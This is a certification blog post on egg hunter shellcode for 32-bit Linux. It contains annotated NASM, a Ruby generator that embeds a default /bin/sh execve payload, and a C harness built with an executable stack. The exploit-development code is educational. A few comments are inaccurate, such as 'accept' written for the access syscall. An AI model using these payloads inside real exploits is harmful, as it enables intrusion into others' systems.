---
title: "SLAE x86 - Assignment 0x3"
date: 2021-10-20T08:27:30Z
draft: false
tags:
  - exploit_dev
  - assembly
categories:
  - certification
keywords:
  - slae
  - shellcode
  - assembly
---

# Egg Hunter Shellcode
## Objectives
- Study about egg hunter shellcode
- Create a working demo of the egg hunter
  - Should be configurable of different payloads

## Overview
Egg hunter shellcode is a helper shellcode that will scan the memory pages to search for a predefined pattern called `egg`.
The egg is appended in the main shellcode that will be executed during the exploitation.
It is useful when there's a limited shellcode size for a vulnerable application's input.
The egg hunter shellcode can then be used as an alternative since it is small, but the main shellcode should be put in other inputs to find it in the memory.
This [`research paper`](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) presented several implementations for both Linux and Windows

## Dissecting the shellcode
Below is the overview of the shellcode utilizing `access(2)` syscall:

```nasm {linenostart=-2}
; Note that the first two columns are moved as comments
; to get proper highlighting of the nasm code.

mov ebx,0x50905090  ; 00000000 BB90509050
xor ecx,ecx         ; 00000005 31C9
mul ecx             ; 00000007 F7E1
or dx,0xfff         ; 00000009 6681CAFF0F
inc edx             ; 0000000E 42
pusha               ; 0000000F 60
lea ebx,[edx+0x4]   ; 00000010 8D5A04
mov al,0x21         ; 00000013 B021
int 0x80            ; 00000015 CD80
cmp al,0xf2         ; 00000017 3CF2
popa                ; 00000019 61
jz 0x9              ; 0000001A 74ED
cmp [edx],ebx       ; 0000001C 391A
jnz 0xe             ; 0000001E 75EE
cmp [edx+0x4],ebx   ; 00000020 395A04
jnz 0xe             ; 00000023 75E9
jmp edx             ; 00000025 FFE2
```

For the first three lines, the registers are being prepared for the next instructions.
See comments in the code below for inline explanation:

```nasm {linenos=false}
mov ebx,0x50905090  ; 0x50905090 is the egg with equivalent instructions of:
                    ; nops; push eax; nops; eax
                    ; The egg is saved into ebx will then be use to compare
                    ; in instructions lines 13 and 14 of full code
xor ecx,ecx         ; clear the value of ecx; ecx xor ecx = 0
mul ecx             ; clear eax and edx
                    ; multiplying 0x0 with eax will result to 0x0 for
                    ; both eax and edx, see https://www.felixcloutier.com/x86/mul
```
Then the next lines prepare registers for the access(2) syscall
```nasm {linenos=false}
or dx,0xfff         ; 0x0 or 0xfff = 0xfff, means dx = 0xfff = 4095
inc edx             ; makes edx = 4096
pusha               ; push registers to stack,
                    ; this is to save the values and then use them later
                    ; since the next line will alter ebx
lea ebx,[edx+0x4]   ; ebx = address to be validated
                    ; in this case is edx + 0x4
                    ; 4 bytes is added since 8 bytes will be validated in single swoop
                    ; which means edx - 0x4 is within the range as well
```
System call access(2), then the return value is stored in eax. More details in: https://man7.org/linux/man-pages/man2/access.2.html
```nasm {linenos=false}
mov al,0x21         ; 0x21 is the code for access(2)
int 0x80            ; syscall access(address_to_be_validated, NULL)
```
The next lines are series of conditions to check if the current page contains the egg
```nasm {linenos=false}
cmp al,0xf2         ; The return value in eax is compared to 0xf2,
                    ; the value for EFAULT - the page is inaccessible.
                    ; If the value are the same, zero flag will be set.
popa                ; restore the previous registers state before line 6
jz 0x9              ; If zero flag is set (page is inaccessible)
                    ; next instruction will be jump back to line 4
                    ; which will increment the dx to check the next page.
                    ; Otherwise, if page is accessible, execution flow will proceed
cmp [edx],ebx       ; Checks if the egg is found in the current page
jnz 0xe             ; if not, jump to line 5 which will iterate through the current page
                    ; else proceed with the execution flow.
cmp [edx+0x4],ebx   ; Checks again if the next 4 bytes contains the egg again
                    ; since it should be prepended twice
jnz 0xe             ; if not, same conditions with line 14
jmp edx             ; if all conditions are met, jump to the current page
```
#### Recall
The egghunter shellcode contains the following stages:
- initialization of registers
- alignment of page to be validated
- inspections of the page by means of several conditions

## Implementation
The below nasm code is the implementation of egghunter shellcode based on the understanding of the concept. This is not tested in several systems and not guaranteed to be working at all times:
```nasm
; Purpose: egghunter
; inspired from: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text
  EGG equ 0x50905090     ; EGG = push eax; nop; push eax; nop

_start:
  xor ecx, ecx           ; clear
  mul ecx                ; registers

page_alignment:
  or bx, 0xfff           ; add 4095 to bx

inspection:
  inc ebx                ; make ebx = 4096 - page size
  mov al, 0x21           ; syscall for accept
  int 0x80               ; execute syscall
  cmp al, 0xf2           ; check if the current page(ebx) is accessible
  jz page_alignment      ; jump to page_alignment if page is inaccessible
  mov edi, ebx           ; mov address in ebx to edi
  mov eax, EGG           ; value of the egg stored in eax
  scasd                  ; check if the current page contains the EGG
                         ; this will scan the address in edi and compare
                         ; with the value of eax;
                         ; this is the same operation used in the third
                         ; implementation of egghunter by skape
  jnz inspection         ; jump to inspection if EGG is not found
  jmp edi                ; if EGG is found, jump to the address
```
## Dynamic Configuration
The simple Ruby script below will dynamically use shellcodes that will be passed into the `-p` or `--payload` flag (default: 'bin/sh'). Also, there are 4 choices which egghunter shellcode to be used: 3 implementations of skape, and the egghunter from [above section](#implementation).

```ruby
#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

# Default payload to use if nothing is pass
# execve(/bin//sh, NULL, NULL)
PAYLOAD = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50'\
          '\x53\x89\xe1\xb0\x0b\xcd\x80'.freeze

def run
  parse_args
  get_egghunter
  compile_nasm
  @egghunter_shellcode = generate_shellcode
  replace_shellcode
  compile_binary
rescue OptionParser::MissingArgument
  puts "Missing argument:"
  @parser.parse %w[--help]
rescue StandardError => e
  puts "An error #{e.inspect} occurred"
  exit(1)
end

# Map the egghunter's filename to use
def get_egghunter
  egghunters = [
    'egghunter_access',
    'egghunter_access_revisited',
    'egghunter_sigaction',
    'egghunter_access_mod'
  ]
  @filename = egghunters[@egghunter - 1]
end

# Compile the nasm code
def compile_nasm
  `nasm -f elf32 -o #{@filename}.o #{@filename}.nasm`
  `ld -m elf_i386 -s -o #{@filename} #{@filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode
  objdump = `objdump -d #{@filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
    .compact.map(&:split).join('\x').prepend('\x')
end

# Replace a value inside a file
def replace_content(filename)
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    egg = @egghunter == 3 ? 'JSNVJSNV' : '\x90\x50\x90\x50'
    payload = egg + (@payload || PAYLOAD)
    c_code.gsub!(/egghunter\[\] = \"\S+\"\;/,
                 "egghunter[] = \"#{@egghunter_shellcode}\"\;")
    c_code.gsub!(/egg\[\] = \"\S+\"\;/, "egg[] = \"#{payload}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2> /dev/null`
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--egghunter", "-e EGGHUNTER_NUMBER",
            "\n\t\tPick which egghunter to use:\n\t\t1: access(2)\n\t\t2: "\
            "access(2) revisited\n\t\t3: sigaction(2)\n\t\t4: modified") do |value|
              @egghunter = value.to_i
    end

    opts.on("--payload", "-p SHELLCODE_PAYLOAD",
            "Payload to be added. Default: '/bin/sh'") do |value|
              @payload = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "Successfully generated \e[32mshellcode\e[0m binary!"
end
```
Also, a shellcode tester C program below is needed to test this setup since the main shellcode with the egg is stored somewhere in the memory while the program executes the egghunter:

```c
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "<egghunger_shellcode>";
unsigned char egg[] = "\x90\x50\x90\x50<main_shellcode>";

void main()
{
	printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
	printf("Egg shellcode Length:  %d\n", strlen(egg));
	int (*ret)() = (int(*)())egghunter;
	ret();
}
```
## Script usage and testing
Below demo shows the options for the Ruby script then usage of default payload and a sample `HelloWorldShellcode-Stack` payload from the course material.
![](egghunter.gif)

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 1558

---
[`Link to Github repository`](https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A3) | [`Link to index page`](../slae_x86)
